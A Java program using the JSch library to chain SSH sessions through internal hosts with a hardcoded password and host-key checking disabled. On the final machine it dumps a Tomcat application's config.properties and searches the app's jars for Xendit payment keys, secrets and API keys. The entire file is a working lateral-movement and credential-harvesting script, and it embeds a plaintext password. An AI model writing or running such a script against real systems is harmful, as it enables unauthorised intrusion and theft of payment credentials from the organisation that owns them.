import com.jcraft.jsch.*;
import java.io.*;
class DFR {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // Read FULL NEO config.properties (base) for xendit secret
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 'echo ---NEO-BASE-CONFIG---;cat /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/classes/config.properties 2>/dev/null | head -60;echo ---NEO-JAR-CONFIG---;for jar in /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/neo-*.jar; do props=$(/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jar tf $jar 2>/dev/null | grep -E \"properties$\"); if [ -n \"$props\" ]; then echo JAR=$jar PROPS=$props; for f in $props; do /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jar xf $jar $f 2>/dev/null; echo ---$f---;cat $f 2>/dev/null | grep -iE \"xendit|xnd_|secret|api.key\" | head -5; done; fi; done' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[32768];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
